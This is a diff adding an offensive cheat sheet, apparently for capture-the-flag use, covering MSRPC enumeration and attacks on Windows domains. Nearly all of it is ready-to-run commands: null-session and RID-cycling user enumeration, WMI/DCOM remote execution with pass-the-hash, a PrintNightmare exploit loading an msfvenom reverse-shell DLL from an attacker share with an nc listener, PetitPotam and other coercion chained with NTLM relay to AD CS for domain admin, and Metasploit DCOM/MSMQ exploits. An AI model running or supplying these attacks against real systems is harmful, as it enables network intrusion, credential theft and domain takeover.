@@ -1,0 +1,104 @@
+MSRPC enum + attack payloads:
+
+NMAP FIRST
+bashnmap --script msrpc-enum -p 135 target
+nmap -p 135,593 --script msrpc-enum target
+nmap -sV -p 135 target
+
+ENUM TOOLS
+bash# rpcclient (best for CTF)
+rpcclient -U "" -N target          # null session
+rpcclient -U "user%pass" target    # authenticated
+
+# Inside rpcclient:
+enumdomusers          # all users
+enumdomgroups         # all groups
+enumdomains           # domain list
+querydominfo          # domain info
+netshareenum          # shares
+queryuser 0x1f4       # query specific user RID
+enumprinters          # printers
+getdompwinfo          # password policy
+lsaquery              # LSA info
+lsaenumsid            # SIDs
+lookupnames admin     # get SID for user
+
+# RID cycling (brute user enumeration)
+for i in $(seq 500 1100); do
+  rpcclient -U "" -N target -c "queryuser $i" 2>/dev/null | grep "User Name"
+done
+
+# impacket
+impacket-rpcdump target
+impacket-rpcdump target | grep -i "ms-rprn\|ms-par"   # PrintSpooler check
+
+# enum4linux-ng
+enum4linux-ng -A target
+
+DCOM/WMI RCE
+bash# WMI exec (port 135 + high ports)
+impacket-wmiexec user:pass@target
+impacket-wmiexec user:pass@target "whoami"
+impacket-wmiexec -hashes :NTLM_HASH user@target
+
+# DCOM exec
+impacket-dcomexec user:pass@target
+impacket-dcomexec -object MMC20 user:pass@target "whoami"
+impacket-dcomexec -object ShellWindows user:pass@target "whoami"
+impacket-dcomexec -object ShellBrowserWindow user:pass@target "whoami"
+
+# crackmapexec via WMI
+crackmapexec wmi target -u user -p pass -x "whoami"
+
+PRINTSPOOLER / PRINTNIGHTMARE
+bash# Check spooler running via RPC
+rpcclient -U "" -N target -c "enumprinters"
+impacket-rpcdump target | grep -i "MS-RPRN"
+
+# PrintNightmare RCE (CVE-2021-1675)
+python3 CVE-2021-1675.py domain/user:pass@target '\\YOURIP\share\shell.dll'
+
+# SpoolSample (trigger auth to your machine → relay)
+SpoolSample.exe target YOURIP
+
+# Setup malicious share for dll
+impacket-smbserver share ./share -smb2support
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f dll -o share/shell.dll
+nc -lvnp 4444
+
+MS-EFSRPC (PetitPotam)
+bash# Coerce auth from DC to your machine
+python3 PetitPotam.py YOURIP target
+# Combine with NTLM relay → AD CS → cert → TGT → DA
+ntlmrelayx.py -t http://ADCS/certsrv/certfnsh.asp --adcs --template DomainController
+
+NTLM RELAY VIA RPC COERCE
+bash# 1. Setup relay
+impacket-ntlmrelayx -t smb://DC_IP --no-http-server -smb2support
+
+# 2. Trigger coercion (any of these)
+python3 PetitPotam.py YOURIP target
+python3 dfscoerce.py YOURIP target
+python3 Coercer.py -t target -l YOURIP
+
+# 3. Get shell or dump SAM
+impacket-ntlmrelayx -t smb://DC_IP -smb2support -i   # interactive shell
+
+MS-RPC SPECIFIC VULNS
+bash# MS03-026 (old but CTFs use it)
+msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; set RHOSTS target; run"
+
+# MS05-017
+msfconsole -q -x "use exploit/windows/smb/ms05_017_msmq; set RHOSTS target; run"
+
+# Check all RPC vulns via metasploit
+msf> use auxiliary/scanner/dcerpc/endpoint_mapper
+msf> set RHOSTS target
+msf> run
+
+FULL RPC PORT SCAN
+bash# RPC uses 135 + dynamic high ports
+nmap -p 135,593,49152-65535 --min-rate=5000 target
+# Then enumerate each endpoint
+impacket-rpcdump target | tee rpc_endpoints.txt
+Go get that flag 🚩
